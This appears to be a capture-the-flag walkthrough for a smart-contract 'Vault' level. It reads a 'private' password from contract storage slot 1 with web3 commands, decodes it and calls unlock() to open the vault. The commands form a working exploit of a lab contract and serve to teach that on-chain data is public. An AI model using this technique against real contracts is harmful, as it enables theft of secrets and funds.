# Set locked to false / Unlock Vault

Objective is to find private password. `private` visibility modifier only meant that other contracts not allowed to read it, however one can still access if its stored on blockchain since EVM state is public

We access storage at slot 1 of vault since its the second variable declared.
```
web3.eth.getStorageAt(contract.address, 1)
```

We can decode the hex value to see the password
```
web3.utils.hexToAscii('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

However this step is not necessary, proceed to unlock the vault
```
contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

Verify
```
contract.locked()
// Output: false
```